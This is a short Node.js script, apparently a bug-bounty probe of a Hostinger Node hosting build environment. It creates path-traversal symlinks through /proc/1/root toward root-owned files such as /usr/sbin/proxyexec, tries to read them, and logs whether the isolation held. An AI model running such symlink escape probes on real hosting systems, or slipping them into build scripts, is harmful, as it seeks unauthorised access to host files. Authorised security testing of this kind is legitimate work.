import fs from "node:fs";
import path from "node:path";

const marker = "HOSTINGER_NODE_HIDEPID_SYMLINK_GATE:r216";
const output = path.resolve("dist");
fs.rmSync(output, { recursive: true, force: true });
fs.mkdirSync(output, { recursive: true });
fs.writeFileSync(path.join(output, "control.txt"), `${marker}:a13e769021044237\n`, { mode: 0o600 });

function createLink(name, target) {
  try {
    fs.symlinkSync(target, path.join(output, name));
    return { created: true, target, isSymlink: fs.lstatSync(path.join(output, name)).isSymbolicLink() };
  } catch (error) {
    return { created: false, target, errorCode: error.code ?? error.name };
  }
}

const safeLink = createLink("owned-link", "control.txt");
const rootLink = createLink("root-owned-probe", "../../../../../../../../proc/1/root/usr/sbin/proxyexec");
const missingLink = createLink("missing-probe", "../../../../../../../../proc/1/root/root/hostinger-h1-nonexistent-r216");

let directRead;
try {
  const body = fs.readFileSync("/usr/sbin/proxyexec");
  directRead = { readable: true, bytes: body.length };
} catch (error) {
  directRead = { readable: false, errorCode: error.code ?? error.name };
}

let linkRead;
try {
  const body = fs.readFileSync(path.join(output, "root-owned-probe"));
  linkRead = { readable: true, bytes: body.length };
} catch (error) {
  linkRead = { readable: false, errorCode: error.code ?? error.name };
}

console.log(JSON.stringify({
  marker,
  directRead,
  linkRead,
  safeLink,
  rootLink,
  missingLink,
  outputEntries: fs.readdirSync(output).sort().slice(0, 64),
  outputRelativeToRepository: path.relative(process.cwd(), output),
}));
